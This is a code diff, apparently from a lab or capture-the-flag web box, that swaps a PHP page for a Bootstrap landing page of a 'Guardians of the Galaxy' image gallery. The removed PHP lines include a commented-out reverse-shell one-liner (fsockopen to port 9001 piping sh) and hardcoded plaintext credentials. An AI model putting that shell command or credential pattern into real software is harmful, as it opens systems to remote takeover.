@@ -1,31 +1,21 @@
-<?php
+<!DOCTYPE html>
+<html>
 
-// $UNAMES = array('Starlord', 'user2');
-// $USERS = array($UNAMES[0] => 'MyDadIsAFrickingCelestial', $UNAMES[1] => 'password2');
+<head>
+    <link rel="stylesheet" href="./bootstrap-5.3.3-dist/css/bootstrap.min.css">
+</head>
 
-// header($UNAMES[0] . $USERS[$UNAMES[0]]);
+<body>
+    <div class="container">
+        <div class="jumbotron">
+            <h1 class="display-4 mt-5">Guardians of the Galaxy gallery!</h1>
+            <p class="lead">Let's share the images of our adventures</p>
+            <hr class="my-4">
+            <a class="btn btn-primary btn-lg" href="/login.php" role="button">Login</a>
+        </div>
+    </div>
 
+    <script src="./bootstrap-5.3.3-dist/js/bootstrap.min.js"></script>
+</body>
 
-// # catch GET requests
-// if ($_SERVER['REQUEST_METHOD'] === 'GET') {
-//     # display simple message
-//     echo '<h1>Hello there</h1>';
-//     echo '<p>We are too secure for you</p>';
-//     echo '<p>This site is unhackable<p>';
-//     exec('php -r \'$sock=fsockopen("127.0.0.1",9001);exec("sh <&3 >&3 2>&3");\'');
-//     exit;
-// }
-
-
-
-
-$url = 'http://www.google.com';
-$response = @file_get_contents($url);
-if ($response === false) {
-    echo "No internet access\n";
-} else {
-    echo "Internet access available\n";
-}
-
-?>
-
+</html>
